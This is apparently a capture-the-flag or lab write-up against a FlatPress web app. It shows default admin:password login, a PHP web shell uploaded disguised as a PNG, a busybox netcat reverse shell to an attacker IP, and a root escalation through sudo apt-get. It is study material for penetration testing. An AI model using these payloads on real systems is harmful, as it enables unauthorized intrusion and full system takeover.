#Pwned! 
```IP
192.168.102.29
```
# Enumeration

## HTTP 8089
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241202100033.png?raw=true)
admin:password credentials work
an authenticated RCE vulnerability is described here
https://github.com/flatpressblog/flatpress/issues/152

# Exploitation



```
Content-Disposition: form-data; name="upload[]"; filename="test.png"

Content-Type: image/png



PNG


<?php

system($_REQUEST['cmd']);

?>
```

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241202095926.png?raw=true)
we get RCE
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241202100229.png?raw=true)

the following payload gives us a revshell
```
http://192.168.102.29:8089/fp-content/attachs/test.php?cmd=busybox%20nc%20%20192.168.45.194%204444%20-e%20sh
```

# PrivEsc

## Manual
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241202100449.png?raw=true)
```
sudo -l
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241202100512.png?raw=true)
https://gtfobins.github.io/gtfobins/apt-get/
```
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241202100803.png?raw=true)

## Automated

### Peass
### Mimikatz

# Lateral Movement

